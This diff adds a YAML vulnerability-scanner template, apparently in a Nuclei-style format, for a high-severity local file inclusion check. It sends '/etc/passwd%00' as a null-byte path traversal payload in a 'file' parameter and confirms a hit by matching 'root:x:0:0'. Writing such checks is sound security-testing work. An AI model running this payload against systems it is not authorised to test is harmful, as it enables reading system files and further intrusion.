@@ -1,0 +1,20 @@
+id: lfi-009
+name: 'Path traversal via file'
+severity: high
+type: active
+tags:
+  - lfi
+  - traversal
+  - file
+description: 'Reads /etc/passwd via file'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      file:
+        - '/etc/passwd%00'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x:0:0'
